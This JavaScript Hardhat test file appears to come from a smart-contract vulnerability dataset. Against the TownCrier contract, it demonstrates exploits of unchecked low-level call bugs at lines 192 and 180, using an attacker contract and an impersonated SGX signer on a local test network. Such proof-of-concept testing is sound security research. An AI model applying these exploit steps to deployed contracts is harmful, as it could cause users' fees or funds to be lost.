const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');
const path = require("path");
const fs = require("fs");

describe("attack unchecked_low_level_calls/unchecked_return_value.sol", function () {
  let owner;
  async function deployContracts() {
    [owner] = await ethers.getSigners();
    const codePath = path.join(__dirname, '../../artifacts/contracts/dataset/unchecked_low_level_calls/0x89c1b3807d4c67df034fffb62f3509561218d30b.sol/TownCrier.json');
    const json = JSON.parse(fs.readFileSync(codePath));
    const TownCrier = await ethers.getContractFactory(json.abi, json.bytecode);
    const contract = await TownCrier.connect(owner).deploy();

    const TownCrierCaller = await ethers.getContractFactory("contracts/unchecked_low_level_calls/0x89c1b3807d4c67df034fffb62f3509561218d30b_attack.sol:TownCrierCaller");
    const caller = await TownCrierCaller.deploy(contract.target);

    return {contract, caller}
  };

  it("exploit unchecked low level call vulnerability in line 192", async function () {
    const {contract, caller} = await loadFixture(deployContracts);
    const SGX_ADDRESS = "0x18513702cCd928F2A3eb63d900aDf03c9cc81593";
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [SGX_ADDRESS],
    });
    const SGX_sign = await ethers.getSigner(SGX_ADDRESS);

    await owner.sendTransaction({
      to: SGX_ADDRESS,
      value: ethers.parseEther("10"),
    });
    
    const requestType = 1;
    
    const requestData = [
      ethers.encodeBytes32String("data")
    ];
    
    await  expect(caller.response(1,1,requestData[0])).to.be.reverted;

    const amount = ethers.parseEther("1");
    const tx = caller.request(requestType, requestData, {value: amount});
    await expect(caller.request(requestType, requestData, {value: amount}))
      .to.emit(contract, "RequestInfo");

    let fee = await contract.requests(1);
    expect(fee[1]).to.be.equal(amount);
    const paramsHash = caller.hash();

    await expect(contract.connect(SGX_sign).deliver(1, paramsHash, 0, ethers.encodeBytes32String("data")))
    .to.emit(contract, "DeliverInfo");
    
    fee = await contract.requests(1);
    expect(fee[1]).to.be.equal(0);
  });

  it("exploit unchecked low level call vulnerability in line 180", async function () {
    const {contract, caller} = await loadFixture(deployContracts);
    const SGX_ADDRESS = "0x18513702cCd928F2A3eb63d900aDf03c9cc81593";
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [SGX_ADDRESS],
    });
    const SGX_sign = await ethers.getSigner(SGX_ADDRESS);

    await owner.sendTransaction({
      to: SGX_ADDRESS,
      value: ethers.parseEther("10"),
    });
    
    const requestType = 1;
    
    const requestData = [
      ethers.encodeBytes32String("data")
    ];
    
    await  expect(owner.sendTransaction({to: caller.target, value: 1})).to.be.reverted;

    const amount = ethers.parseEther("1");
    const tx = caller.request(requestType, requestData, {value: amount});
    await expect(caller.request(requestType, requestData, {value: amount}))
      .to.emit(contract, "RequestInfo");

    let fee = await contract.requests(1);
    expect(fee[1]).to.be.equal(amount);
    const paramsHash = caller.hash();

    await expect(contract.connect(SGX_sign).deliver(1, paramsHash, 3, ethers.encodeBytes32String("data")))
    .to.emit(contract, "DeliverInfo");
    
    fee = await contract.requests(1);
    expect(fee[1]).to.be.equal(0);
  });
});
